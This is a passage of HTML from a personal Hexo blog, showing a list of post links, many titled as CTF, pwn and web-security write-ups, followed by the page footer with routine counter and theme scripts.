href="/2022/05/16/%E5%9C%A8unity%E4%B8%AD%E4%BD%BF%E7%94%A8DragonBones%E9%AA%A8%E9%AA%BC/">在unity中使用DragonBones骨骼的方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/RITSEC-CTF-2022%20-PWN-hangpwn/">RITSEC-CTF-2022-PWN-hangpwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/03/HTB-Login%20Simulator-pwn-challenge-wp/">HTB-Login Simulator-pwn-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/26/HTB-baby_ninja_jinja-web-challenge-wp/">HTB-baby_ninja_jinja-web-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/26/HTB-Neonify-web-challenge-wp/">HTB-Neonify-web-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/08/HTB-Pandora-wp/">HTB-Pandora-Machine-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/22/HSC2021-CTF/">HSC2021-CTF-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/31/sctf2021-pwn-dataleak/">sctf2021-pwn-dataleak-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/04/%E4%B8%9C%E8%BD%AF/">东软2021CTF--PWN--wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/03/cosy-casino-pwn-challenge-wp/">HTB-cosy_casino-pwn-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/27/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E7%A7%8B%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E5%B1%B1%E5%B3%B0/">2021年春秋杯网络安全联赛秋季赛勇者山峰-WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/">Large bin Attack for Glibc 2.31 学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/">解决yelee模板下live2d看板娘和busuanzi不蒜子计数冲突</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/">Hunting— HTB  PWN  challenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/">xman的leve5另一种解法(mprotect)学习与利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/">ctfshow-月饼杯2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/16/'could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!'%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/">\`could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!\`报错缓解方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/">5种字符'(^.9)'构造php_shellcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/17/ractf2021-pwn-ctf/">ractf2021-pwn-ctf</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/28/imaginaryctf2021--pwn-wp/">imaginaryctf2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">高版本libc(2.29-2.32) off by null利用姿势笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/26/2021qwb%20pwn%20wp/">2021qwb-pwn-初赛-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/28/ISCC2021%20PWN%20WP/">ISCC2021 PWN部分 WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/">ret2dl-resolve利用方法小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">系统调用与SROP方法学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/">pwn堆题泄露libc真实地址小tirck</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/28/CTF%202021%20PWN%20babyheap%20%20%E5%A4%8D%E7%8E%B0%E8%AE%B0/">2021*CTF_PWN_babyheap复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(9)/">关于格式化字符串利用——学pwn小记(9)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/17/Tcache%20attack%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(8)/">Tcache attack初学习——学pwn小记(8)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/">从对b00k题目学习中初习off-by-one——学pwn小记(7)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/08/actf--wp/">ångstromCTF 2021--wp与复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/">修改ELF文件libc为指定版本</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">劫持hook函数——学pwn小记(6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/">fastbin二次释放——学pwn小记(5)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">网鼎杯 2018-Comment  复现笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/">关于sql注入bypass总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/">安洵杯2019复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">xman pwn题复现——学pwn小记（4）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/">flask.request的内置属性总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/">对php伪协议的归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/21/HWCTF-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BAWP/">HWCTF-华为云场WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/16/linux%20%E5%86%85%E7%BD%AE%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/">linux 内置参数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/">关于jinja2特性对ssti的bypass的影响</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/16/%E5%85%B3%E4%BA%8Ephp%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/">php执行与文件系统处理函数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/">第五届上海市大学生网络安全大赛-初赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/12/ctf-show_%E5%8E%9F%E8%B0%85%E6%9D%AFwp/">ctf-show_原谅杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/26/ctf-show%201024%E6%9D%AF/">ctf-show 1024杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/15/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(3)/">Linux_x64下的ret2bilc与ret2csu--学习pwn小记(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/14/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/">第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp/第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/22/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/">第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/13/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(2)/">学习pwn小记(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/">对linux 命令执行的总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/">学习pwn小记(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">关于SQL注入小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/%E5%AE%89%E6%81%92DASCTF%207%E6%9C%88%E8%B5%9BWP/">安恒DASCTF 7月赛WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/15/rgbCTF--wp/">sctf2020 pythonbox题目复现小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/18/NahamCon%20CTF%20WP/">NahamCon CTF WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">对于文件包含漏洞的知识梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于php反序列化字符逃逸的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/">如何让文件里PHP代码被服务器解析执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/21/%E8%99%8E%E7%AC%A6CTF2020--EasyLogin%20%20%20Write%20%20up/">虎符CTF2020--EasyLogin WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于python ssti的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/10/cocos2d%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E6%B1%89%E5%8C%96--Writing%20a%20cocos2d%20application/">cocos2d官方文档汉化--Writing a cocos2d application</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/03/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+
+
+</div>
+
+
+
+
+  
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+        	                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("01/03/2019 12:39:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019-2025 lexsd6
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+
+    <div class="visit">
+        
+            <span id="busuanzi_container_site_pv" style='display:inline'>
+                <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                </span>
+            </span>
+        
+        
+            <span>| </span>
+        
+        
+            <span id="busuanzi_container_page_pv" style='display:inline'>
+                <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                </span>
+            </span>
+        
+    </div>
+
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 20;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+  </div>
+
+
+</body>
+</html>
